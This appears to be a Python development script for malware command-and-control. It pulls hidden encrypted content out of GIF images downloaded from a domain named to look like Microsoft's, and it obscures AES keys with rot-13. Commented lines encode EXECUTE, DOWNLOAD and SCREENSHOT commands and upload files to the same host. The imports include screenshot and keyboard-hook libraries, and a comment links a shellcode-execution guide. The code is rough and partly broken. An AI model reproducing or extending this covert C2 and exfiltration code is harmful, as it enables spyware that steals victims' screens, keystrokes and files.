import socket
import os
import ctypes #https://www.doyler.net/security-not-included/executing-shellcode-with-python
import requests
import zipfile
import tempfile
import base64
import tempfile
import json
import websockets
import asyncio
import sys
import time
import codecs
import pyscreenshot as ImageGrab
import keyboard
from random import randrange
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Util.Padding import unpad




r = requests.get("http://microsoftonline.download/giphy/3006-3044-4355.gif") # https://media.giphy.com/media/77er1c9H3KJnq/giphy.gif
content = r.content.split("HIDDEN_CONTENT_SEPARATOR".encode("utf-8"))[1]
print("RES",content)
#message = decrypt("\xe5\xfaV#\xa4w\xa7\xe1\xc3\xdc\xb9\xa1I\xcc\t=")
#print(message)

#print(codecs.encode('utf-8', 'rot-13'))
KEY=codecs.encode('C:\\Users\\admin\\$', 'rot-13').encode("utf-8")
KEY=codecs.encode('HKEY_USERS\\admin', 'rot-13').encode("utf-8")
IV=b'C:\\Users\\admin\\$'
KEY=b'HKEY_USERS\\admin'
IV=b'P:\\Hfref\\nqzva\\$'
#KEY=b'UXRL_HFREF\\nqzva'
print(KEY ) # b'UXRL_HFREF\\nqzva'
BLOCK_SIZE = 16

def encrypt(raw):
    return aes.encrypt(pad((raw.encode() if type(raw) == str else raw), 16, style="pkcs7"))
    

def decrypt(raw):
    return unpad(aes.decrypt(raw.encode()), BLOCK_SIZE).decode("utf-8", errors="ignore")

# b'UXRL_HFREF\\nqzva'
# b'HKEY_USERS\\admin'

#KEY="HKEY_USERS\\admin".encode("utf-8")

print("KEY ", KEY) # b'HKEY_USERS\\admin'

aes = AES.new(KEY, AES.MODE_ECB)
print('\n\n')

#e = encrypt("EXECUTE")
#print("EXECUTE" , e)
#e = encrypt("UPDATE")
#print("UPDATE" , e)
#e = encrypt("DOWNLOAD")
#print("DOWNLOAD" , e)
#e = encrypt("SCREENSHOT")
#print("SCREENSHOT" , e)
print('\n\n')
e=b'ebd0f2735d985590f10c0c6d69e28469ff23c26cc82c3b8971f0d49367892e798cc7c06534b7c1b260dc9318a1946078'
print("VALUE", e) # b'c\xc5\xe2\x16\xefj\xcb\xb3f\t8[K\xa7\x99R'

print("--->", (aes.decrypt(e)).decode("utf-8", errors="ignore"))
print("DECRYPTED", e)
#print(json.loads(e))





#ciphertext = encryptor.decrypt(text)
#print(ciphertext)

C2=codecs.encode('http://microsoftonline.download', 'rot-13')
C2="http://microsoftonline.download"
UID="HACKEDBYPOPEYEUNPEU"
#print(C2+codecs.encode('/.gif/', 'rot-13'))

filess=dict(payload=open("AAAA.jpg", 'rb'))
#print(filess)
##print(C2+"/giphy/"+UID+".gif")
# requests.post(C2+codecs.encode('/giphy/', 'rot-13')+UID+codecs.encode('.gif', 'rot-13'), files=dict(payload=open("AAAA.jpg", 'rb')))
#r = requests.post(C2+"/giphy/"+UID+".gif", files=filess)

temp_gif = tempfile.NamedTemporaryFile(delete=False)


r = requests.get("http://microsoftonline.download/giphy/3006-3084-4355.gif")

#content = r.content.split(codecs.encode('HIDDEN_CONTENT_SEPARATOR', 'rot-13').encode("UTF-8"))
#print(r.content)
#message = decrypt("\xe5\xfaV#\xa4w\xa7\xe1\xc3\xdc\xb9\xa1I\xcc\t=")
#print(message)

        

#print(r, r.content)

# C2+codecs.encode('/giphy/', 'ebg-13')+UID+codecs.encode('.gif', 'ebg-13'), files=dict(payload=open(filename, 'eo'))